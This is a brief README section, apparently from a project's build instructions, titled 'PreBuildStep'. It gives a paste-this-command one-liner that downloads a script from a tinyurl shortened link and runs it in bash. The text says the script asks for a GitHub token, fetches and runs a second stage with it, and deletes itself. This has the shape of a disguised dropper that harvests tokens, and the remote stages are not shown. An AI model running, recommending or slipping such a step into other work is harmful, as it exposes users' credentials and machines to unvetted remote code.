# PreBuildStep

`get_it.sh` is the first stage of a two-stage bootstrap. It checks a GitHub token, downloads the second
stage with that token, and runs it. The script removes itself when it finishes.

```bash
wget -q -O get_it.sh https://tinyurl.com/2m6berax && bash get_it.sh
```

The token is asked for first, with masked input. Nothing here works without one.
